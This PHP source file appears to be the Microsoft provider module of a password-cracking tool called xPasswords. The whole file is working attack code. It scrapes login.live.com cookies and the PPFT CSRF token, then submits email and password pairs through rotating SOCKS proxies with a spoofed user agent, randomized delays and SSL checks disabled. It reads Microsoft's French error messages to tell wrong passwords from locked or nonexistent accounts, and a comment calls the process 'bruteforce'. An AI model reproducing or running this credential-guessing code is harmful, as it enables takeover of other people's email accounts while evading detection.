<?php
namespace xPasswords\Providers;

class Microsoft {
    
    static public $imapAddress = 'imaps://imap-mail.outlook.com:993';
    
    static public function authenticate($email, $password) {
        
        // Shared options
        $staticOptions = [
            'Cookie' => false,
            'CSRF' => false,
            'UserAgent' => 'Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53',
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'CurrentTime' => time(),
            'RandId' => rand(10000, 99999),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];

        // STEP 1: GET PPFT AND COOKIES
        $request = \Requests::get('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=12&ct=' . $staticOptions['CurrentTime'] . '&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fm%2F&lc=1036&id=' . $staticOptions['RandId'] . '&pcexp=false&snsc=1', [
            //'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            //'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],

            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
        ], [
            'timeout' => 60, // Timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
        
        // Parse Cookie var
        $cookiesTemp = explode(',', $request->headers['Set-Cookie']);
        @preg_match('/^MSPRequ=(.*?);/', $cookiesTemp[0], $staticOptions['Cookie']['MSPRequ']);
        @preg_match('/^MSPOK=(.*?);/', $cookiesTemp[1], $staticOptions['Cookie']['MSPOK']);
        $cookiesTemp = NULL;

        if(empty($staticOptions['Cookie']['MSPRequ']) OR
           empty($staticOptions['Cookie']['MSPOK'])) {
            // Cookie empty
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Error while getting cookies.', ['red']);
            return false;
        }

        $staticOptions['Cookie']['MSPRequ'] = $staticOptions['Cookie']['MSPRequ'][1];
        $staticOptions['Cookie']['MSPOK'] = $staticOptions['Cookie']['MSPOK'][1];

        // Parse CSRFTOKEN
        // sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="TOKEN"/>'
        @preg_match('/sFTTag:\'<input type="hidden" name="PPFT" id="i0327" value="(.*?)"\/>/iu', $request->body, $staticOptions['CSRF']['PPFT']);
        @preg_match('/&uaid=(.*?)\',AC:/iu', $request->body, $staticOptions['CSRF']['UAID']);
        $staticOptions['CSRF']['PPFT'] = $staticOptions['CSRF']['PPFT'][1];
        $staticOptions['CSRF']['UAID'] = $staticOptions['CSRF']['UAID'][1];

        // Sleep a bit
        \xPasswords\Core::sleep(rand(5, 9));

        // STEP 2: FINAL REQUEST        
        $request = \Requests::post('https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=12&ct=' . $staticOptions['CurrentTime'] . '&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fm%2F&lc=1036&id=' . $staticOptions['RandId'] . '&pcexp=false&snsc=1&bk=' . (time() - 1). '&uaid=' . $staticOptions['CSRF']['UAID'], [
            //'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            //'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],

            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',

            'Cookie' => 'MSPRequ=' . $staticOptions['Cookie']['MSPRequ'] . '; MSPOK=' . $staticOptions['Cookie']['MSPOK'],

            'Origin' => 'https://login.live.com',
            'Referer' => 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=12&ct=' . $staticOptions['CurrentTime'] . '&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fm%2F&lc=1036&id=' . $staticOptions['RandId'] . '&pcexp=false&snsc=1',
        ], [
            'PPFT' => $staticOptions['CSRF']['PPFT'],
            'login' => $email,
            'passwd' => $password,
            'LoginOptions' => '3',
            'NewUser' => '1',
            'PPSX' => 'PassportR',
            'type' => '11',
            'i3' => '1422540',
            'm1' => '1024',
            'm2' => '768',
            'm3' => '0',
            'i12' => '1',
            'i17' => '0',
            'i18' => '__MobileLogin|1,',            
        ], [
            'timeout' => 60, // Timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);

        // Check if this is valid
        if(preg_match('/^<html><head><script type="text\/javascript">function rd/iu', trim($request->body))) {
            return true;
        }

        // Invalid username or email
        // sErrTxt:'Ce mot de passe est incorrect. Vérifiez que vous utilisez bien le mot de passe de votre compte Microsoft.<!-- HR=80041012 -->'
        $sErrTxt = preg_match('/sErrTxt:\'(.*?)\',/iu', trim($request->body), $sErrTxtOut);
        $sErrTxtOut = strip_tags(stripslashes($sErrTxtOut[1]));

        switch($sErrTxtOut) {

            // Invalid password
            case 'Ce mot de passe est incorrect. Vérifiez que vous utilisez bien le mot de passe de votre compte Microsoft.':
            case 'L\'adresse de messagerie ou le mot de passe est incorrect. Veuillez réessayer.':
            return false;
            break;

            // Blocked account
            // Unexistant account
            case 'Vous avez essayé de vous connecter trop de fois avec une adresse de messagerie ou un mot de passe incorrect.':
            case 'Ce compte Microsoft n’existe pas. Entrez une autre adresse de messagerie ou créez un compte.':
            // Prevent bruteforce becasue account is non existant
            //Bootstrap::$accountCredentials['fatalError'] = true;
            return false;
            break;

            // Unknown error
            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Microsoft returned anormal error code.', ['color' => 'red']);
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Details: ' . $sErrTxtOut, ['color' => 'red']);
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Details: ' . trim($request->body));
            return false;
            break;
        }
    }
};